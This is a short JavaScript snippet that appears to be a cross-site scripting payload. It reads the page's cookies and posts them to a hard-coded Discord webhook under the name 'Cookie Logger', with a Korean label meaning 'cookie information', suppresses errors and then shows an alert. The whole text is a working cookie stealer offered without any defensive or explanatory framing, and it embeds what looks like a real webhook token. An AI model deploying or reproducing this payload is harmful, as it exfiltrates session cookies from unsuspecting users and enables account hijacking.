const webhookUrl = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';

const cookies = document.cookie;

fetch(webhookUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        content: `**쿠키 정보:**\n\`\`\`\n${cookies}\n\`\`\``,
        username: 'Cookie Logger'
    })
})
.catch(() => {});
alert('hello');
